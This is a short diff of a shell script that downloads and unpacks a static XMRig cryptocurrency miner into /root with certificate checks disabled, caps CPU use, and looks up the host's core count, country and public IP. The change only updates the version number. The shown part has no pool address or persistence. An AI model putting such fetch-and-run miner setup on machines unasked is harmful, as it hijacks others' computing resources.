@@ -5,8 +5,8 @@ sudo apt-get install cpulimit -y
 sudo apt-get install bc -y
 wget --no-check-certificate -O xmrig.tar.gz https://github.com/xmrig/xmrig/releases/download/v6.24.0/xmrig-6.24.0-linux-static-x64.tar.gz
 tar -xvf xmrig.tar.gz
-chmod +x ./xmrig-6.21.0/* 
-mv /root/xmrig-6.21.0/* /root/
+chmod +x ./xmrig-6.24.0/* 
+mv /root/xmrig-6.24.0/* /root/
 cores=$(nproc --all)
 country=$(curl -s ipinfo.io | jq -r '.country')
 IP4=$(curl -4 -s icanhazip.com)
